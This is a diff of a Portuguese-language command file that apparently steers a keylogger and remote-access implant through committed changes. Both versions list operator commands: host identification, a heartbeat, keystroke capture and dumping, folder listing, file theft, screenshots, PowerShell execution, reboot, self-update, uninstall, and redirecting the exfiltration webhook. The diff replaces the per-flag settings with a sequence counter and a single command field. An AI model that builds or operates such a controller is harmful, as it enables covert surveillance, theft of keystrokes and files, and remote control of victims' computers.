@@ -1,51 +1,15 @@
-# =========================================================
-#  CONTROLADOR. Metes 1 e fazes commit. Corre UMA vez.
-#  Para repetir, muda outra coisa (ex: acrescenta #2 no fim).
-#  Tudo em minusculas. Repoe a 0 quando acabares.
-# =========================================================
+# Sobe o seq em 1 e escreve o comando em cmd. Um de cada vez.
 #
-# --- IDENTIFICACAO ---
-# who=1 ....... devolve host, utilizador, IP, SO, uptime
-# info=1 ...... igual ao who
-# hb=1 / hb=0 . heartbeat a cada 20 min (estado, deixa a 1)
+# who | ping | dump | shot | shut | reboot | sleep | update | uninstall
+# ls:C:\pasta
+# get:C:\ficheiro
+# sh:comando
+# webhook:https://...
 #
-# --- KEYLOG ---
-# log=1 / log=0   liga/desliga a captura (estado, deixa a 1)
-# live=0 / live=1 0 = so envia em eventos | 1 = envia a cada 30s
-# dump=1 ......... envia ja o que esta pendente
-#
-# --- FICHEIROS ---
-# ls=1 ......... lista uma pasta (preenche ls_path)
-# get=1 ........ envia um ficheiro (preenche get_path)
-# shot=1 ....... captura de ecra
-#
-# --- SISTEMA ---
-# sh=1 ......... executa PowerShell (preenche sh_cmd)
-# reboot=1 ..... reinicia a maquina
-# sleep=1 ...... suspende a maquina
-# update=1 ..... descarrega versao nova e reinicia
-# uninstall=1 .. apaga tudo
-# webhook=1 .... muda o destino (preenche webhook_url)
-#
-# --- VALORES ---
-ls_path=
-get_path=
-sh_cmd=
-webhook_url=
+# log=1 captura | live=0 so em eventos | hb=1 heartbeat
 
-who=1
-info=0
-dump=1
-ls=0
-get=0
-shot=0
-sh=0
-reboot=1
-sleep=0
-update=0
-uninstall=0
-webhook=0
+seq=1
+cmd=who
 log=1
 live=0
 hb=1
-ping=1
